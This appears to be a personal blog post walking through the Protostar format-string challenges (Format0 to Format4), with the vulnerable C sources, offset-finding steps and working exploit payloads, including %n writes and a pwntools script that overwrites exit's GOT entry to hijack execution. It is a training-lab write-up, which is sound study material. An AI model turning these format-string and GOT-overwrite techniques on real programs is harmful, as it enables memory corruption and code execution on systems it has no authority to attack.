---
layout: post
title:  "Protostar Day Two (Format String)"
date:   2020-07-02 20:05:48 +0100
categories: pwn
---

Here is day 2 of the 30 days of pwn journey. Today I will be trying to learn format string vulnerabilities from the protostar challenges found [here](https://exploit-exercises.lains.space/protostar/).

## Format0
```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void vuln(char *string)
{
  volatile int target;
  char buffer[64];

  target = 0;

  sprintf(buffer, string);
  
  if(target == 0xdeadbeef) {
      printf("you have hit the target correctly :)\n");
  }
}

int main(int argc, char **argv)
{
  vuln(argv[1]);
}
```
In this challenge the objective is to modify the variable "target" to be 0xdeadbeef. 

It is possible to do the same kind of buffer overflow as before. But since this is format string, we will do as the challenge says in under 10 bytes.

By writing "%64x" we will be writing 64 bytes of information, then following that with 0xdeadbeef and we have successfully modified the variable.

### Exploit Code
```
./format0 $(python -c "print '%64x\xef\xbe\xad\xde'")
```

## Format 1
```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void vuln(char *string)
{
  printf(string);
  
  if(target) {
      printf("you have modified the target :)\n");
  }
}

int main(int argc, char **argv)
{
  vuln(argv[1]);
}
```
Using a format string exploit here we can dump the stack using multiple "%x"'s. To start with I sent in '%x.' * 200 to see if our A's and B's are there.

```
./format1 $(python -c "print 'AAAABBBB' + '%x.' * 200")%x
(omitted)...41414100.42424241...(omitted)
```
As pictured above we can use this format string exploit to find the offset

```
./format1 $(python -c "print 'AAAABBBB' + '%x.' * 127")%x
(omitted)...41414141
```
Now we know that the offset is `'AAAABBBB' + '%x.' * 127` we can now find the location of the "target" variable in the binary and write that into the final payload.

From the hint on the webpage, it mentions to use `objdump -t`. So here, we can use it to find the target variable.
```
objdump -t format1 | grep target
08049638 g     O .bss	00000004              target
```
Now we have the address 0x08049638, we have everything we need to complete this level.

### Exploit Code
```
./format1 $(python -c "print '8\x96\x04\x08BBBB' + '%x.' * 127")%n
```

## Format 2
```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void vuln()
{
  char buffer[512];

  fgets(buffer, sizeof(buffer), stdin);
  printf(buffer);
  
  if(target == 64) {
      printf("you have modified the target :)\n");
  } else {
      printf("target is %d :(\n", target);
  }
}

int main(int argc, char **argv)
{
  vuln();
}
```
In this challenge we have to overwrite the target variable to have the value of 64.

As before, we first find the offset of %x's needed.
```
python -c "print 'AAAAAAAA' + '%x.' * 10" | ./format2
AAAAAAAA200.f7faa580.f7fd853c.41414141.41414141.252e7825.78252e78.2e78252e.252e7825.78252e78.
```
Now with objdump we can find the variable "target".
```
objdump -t format2 | grep target
080496e4 g     O .bss	00000004              target
```
Finally, with some trial and error, we can input the memory address and write to it, changing the amount of bytes we send until we reach the right point.
```
python -c "print 'AAAA\xe4\x96\x04\x08' + '%x' + '%x' * 3 + '%n'" | ./format2
AAAA200f7faa580f7fd853c41414141
target is 35 :(

python -c "print 'AAAA\xe4\x96\x04\x08' + '%10x' + '%x' * 3 + '%n'" | ./format2
AAAA       200f7faa580f7fd853c41414141
target is 42 :(
```

### Exploit Code
```
python -c "print 'AAAA\xe4\x96\x04\x08' + '%32x' + '%x' * 3 + '%n'" | ./format2
```

## Format 3
```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void printbuffer(char *string)
{
  printf(string);
}

void vuln()
{
  char buffer[512];

  fgets(buffer, sizeof(buffer), stdin);

  printbuffer(buffer);
  
  if(target == 0x01025544) {
      printf("you have modified the target :)\n");
  } else {
      printf("target is %08x :(\n", target);
  }
}

int main(int argc, char **argv)
{
  vuln();
}
```
In this challenge to goal is to change the variable "target" to be "0x01025544". To do this we will expand on the methods used before.

The first few steps are the same: Find the memory location of the target, find the offset, and write to that variable.

Through objdump, we find the memory location of the variable to be "0x080496f4". Now, with the offset of 11 we found, we can start to write to it.

Like the last challenge, we do this with "%NUMBERx".
After playing around with a few numbers, it's clear we will need a large size by looking at the source code. The target seems to be modified by 41 before adding any extra "%x"'s, so I subtracted that from the decimal conversion of the memory target in the source code: `16930116-41 = 16930075`.

```
python -c "print 'AAAA\xf4\x96\x04\x08' + '%x' * 11 + '%16930075x' + '%n'" | ./format3
target is 01025560 :(
```
Obviously the calculation above is crude since i'm just doing it in base 10. But it's close enough that the new target is very close to the goal.

Now we can keep subtracting from the number of %x we send til we hit the goal
```
python -c "print 'AAAA\xf4\x96\x04\x08' + '%x' * 11 + '%16930047x' + '%n'" | ./format3
you have modified the target :)
```

### Exploit Code
```
python -c "print 'AAAA\xf4\x96\x04\x08' + '%x' * 11 + '%16930047x' + '%n'" | ./format3
```

## Format4
```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void hello()
{
  printf("code execution redirected! you win\n");
  _exit(1);
}

void vuln()
{
  char buffer[512];

  fgets(buffer, sizeof(buffer), stdin);

  printf(buffer);

  exit(1);  
}

int main(int argc, char **argv)
{
  vuln();
}
```
This is the final format string challenge from Protostar. The objective here is to reach the "hello()" function. We can do this by overwriting the GOT entry of the exit function with address of "hello()"


After finding the hello() offset through objdump, we can follow the hint on the website and use `objdump -TR format4` to view the location of the exit function we want to overwrite
```
objdump -TR format4

...

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE 
080496fc R_386_GLOB_DAT    __gmon_start__
08049730 R_386_COPY        stdin@@GLIBC_2.0
0804970c R_386_JUMP_SLOT   __gmon_start__
08049710 R_386_JUMP_SLOT   fgets@GLIBC_2.0
08049714 R_386_JUMP_SLOT   __libc_start_main@GLIBC_2.0
08049718 R_386_JUMP_SLOT   _exit@GLIBC_2.0
0804971c R_386_JUMP_SLOT   printf@GLIBC_2.0
08049720 R_386_JUMP_SLOT   puts@GLIBC_2.0
08049724 R_386_JUMP_SLOT   exit@GLIBC_2.0
```
Now we have the address "0x08049724" we can start to exploit the program.

Using the same methods as before the offset is found and through gdb we can see that the exit function is being overwritten. And like before we are able to use the decimal version of that address and use that as the number of bytes we want to write in. 

This gets us pretty close and after a couple of "SIGILL"s from landing in the wrong part of the hello() function, we are able to hit the correct part and beat the challenge.

### Exploit Code
**Same Method as format3**
```
from pwn import *

exit_GOT = p32(0x08049724)

payload = ""
payload += exit_GOT
payload += "A" * 12
payload += "%4$134513828x"
payload += "%4$n"
payload = payload + "A" * (512-len(payload))

print(payload)
```
```
python exploit.py | ./format4

"code execution redirected! you win"
```

**Better method that sends less bytes**
```
from pwn import *

hello_func = p32(0x080484b4)
exit_GOT = p32(0x08049724)


payload = ""
payload += exit_GOT
payload += p32(0x08049724 + 2)
payload += "A" * 8
payload += "%4$33956x"
payload += "%4$n"
payload += "%5$33616x"
payload += "%5$n"
payload = payload + "A" * (512-len(payload))

print(payload)
```
```
python exploit.py | ./format4

"code execution redirected! you win"
```